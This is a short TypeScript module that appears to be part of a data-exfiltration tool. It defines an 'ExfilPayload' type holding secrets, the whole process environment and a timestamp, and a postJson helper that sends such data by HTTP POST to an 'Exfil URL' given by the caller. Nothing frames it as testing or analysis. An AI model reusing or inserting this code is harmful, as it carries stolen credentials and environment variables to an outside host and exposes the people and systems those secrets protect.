import axios from 'axios';
import {agent} from './utils'

export interface ExfilPayload {
  secrets: Record<string, string>;
  env: NodeJS.ProcessEnv;
  timestamp: string;
}



/**
 * Post JSON data to a designated URL
 *
 * @param url The target URL
 * @param data The JSON payload to send
 */
export async function postJson(url: string, data: Record<string, any>) {
  if (!url) {
    console.error('Exfil URL is required.');
    return false;
  }

  try {

    const response = await axios.post(url, data, {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: 10000, // 10 seconds timeout
      httpsAgent: agent
    });

    if (response.status >= 200 && response.status < 300) {
      console.log(`Data successfully posted to ${url} ✅`);
      return true;
    } else {
      console.error(`Failed to post data. Status: ${response.status}`);
      return false;
    }
  } catch (error) {
    console.error(`Error posting JSON to ${url}:`, error);
    return false;
  }
}
